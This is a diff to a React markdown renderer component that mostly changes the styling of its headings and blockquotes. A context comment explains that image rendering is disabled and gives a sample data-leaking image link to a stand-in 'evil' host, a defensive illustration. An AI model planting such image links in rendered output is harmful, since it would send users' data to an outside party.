@@ -46,17 +46,17 @@ export const MarkdownRenderer: React.FC<MarkdownRendererProps> = ({
         // Never load images: a page-planted ![](https://evil/?data=...) would leak data when rendered
         img: () => null,
         h1: ({ children }) => (
-          <h1 className="text-2xl font-bold text-slate-100 mt-6 mb-4">
+          <h1 className="mb-4 mt-6 text-2xl font-semibold text-slate-100">
             {children}
           </h1>
         ),
         h2: ({ children }) => (
-          <h2 className="text-xl font-semibold text-slate-200 mt-5 mb-3">
+          <h2 className="mb-3 mt-5 text-xl font-semibold text-slate-200">
             {children}
           </h2>
         ),
         h3: ({ children }) => (
-          <h3 className="text-lg font-semibold text-slate-300 mt-4 mb-2">
+          <h3 className="mb-2 mt-4 text-lg font-semibold text-slate-300">
             {children}
           </h3>
         ),
@@ -111,7 +111,7 @@ export const MarkdownRenderer: React.FC<MarkdownRendererProps> = ({
           </li>
         ),
         blockquote: ({ children }) => (
-          <blockquote className="border-l-4 border-blue-500 pl-4 italic text-slate-400 my-4">
+          <blockquote className="my-4 rounded-lg border border-slate-700 px-4 py-3 text-slate-500">
             {children}
           </blockquote>
         ),
